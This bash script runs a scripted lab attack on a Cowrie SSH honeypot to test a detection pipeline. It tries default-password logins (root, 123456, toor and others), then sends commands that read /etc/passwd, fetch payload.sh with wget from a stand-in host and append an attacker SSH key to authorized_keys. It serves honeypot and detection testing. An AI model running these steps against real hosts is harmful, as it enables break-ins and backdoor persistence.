#!/usr/bin/env bash
# Scripted demo attack on the lab trap. Stands in for a real attacker and needs no internet.
# Run `scripts/lab.sh up` first and wait ~15s. The attacker is the "attacker" namespace (10.77.0.2).
# Expected result in the pipeline: score 70 (BLOCK_CANDIDATE).
set -euo pipefail

HOST_IP=172.30.0.1   # lab host address the trap is published on
PORT=2223            # the open trap (stands in for port 22)
NS=attacker

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

sudo ip netns list | grep -qw "$NS" || { echo "ERROR: lab is not up. Run: scripts/lab.sh up" >&2; exit 1; }

# SSH asks this script for a password at every prompt; it hands out the next one.
# All five are well-known pairs, so whichever one Cowrie accepts counts as a default credential.
cat > "$WORK/askpass.sh" <<'EOS'
#!/usr/bin/env bash
list=(root 123456 password toor admin)
n=$(cat "$ASKPASS_STATE" 2>/dev/null || echo 0)
echo $((n + 1)) > "$ASKPASS_STATE"
echo "${list[$((n % ${#list[@]}))]}"
EOS
chmod +x "$WORK/askpass.sh"
echo 0 > "$WORK/state"

{
  sleep 4
  for c in "whoami" "id" "uname -a" "cat /etc/passwd" "ps aux" \
           "wget http://example.com/payload.sh" "chmod +x payload.sh" \
           "crontab -l" 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADemoKey demo@attacker" >> ~/.ssh/authorized_keys' \
           "exit"; do
    echo "$c"
    sleep 1.5
  done
} | sudo ip netns exec "$NS" env \
      SSH_ASKPASS="$WORK/askpass.sh" SSH_ASKPASS_REQUIRE=force ASKPASS_STATE="$WORK/state" DISPLAY=none \
    ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=6 \
        -p "$PORT" "root@$HOST_IP"

echo "ATTACK_DONE"
